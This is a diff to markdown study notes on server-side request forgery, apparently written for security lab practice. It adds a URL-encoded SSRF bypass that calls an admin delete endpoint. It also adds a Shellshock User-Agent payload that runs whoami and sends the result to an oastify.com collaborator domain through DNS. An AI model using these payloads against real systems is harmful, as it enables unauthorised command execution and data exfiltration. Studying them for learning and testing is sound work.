@@ -51,8 +51,19 @@ https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Preve
 * `https://evil-host#expected-host`
 * `https://expected-host.evil-host`
 * Open redirects
-
+* URL-encode, double URL-encode
+Example:
+```
+stockApi=http%3A%2F%2Flocalhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+```
 ##### Attack surfaces
 * Partial URLs in requests
 * XML - SSRF via XXE
 * Referer
+
+#### Shellshock exploitation
+Use #burp Collaborator Everywhere extension to detect vulnerable for SSRF headers.
+Payload example:
+```http
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).4gl54yveqtl0rtvr3fq0s943jupldf14.oastify.com
+```
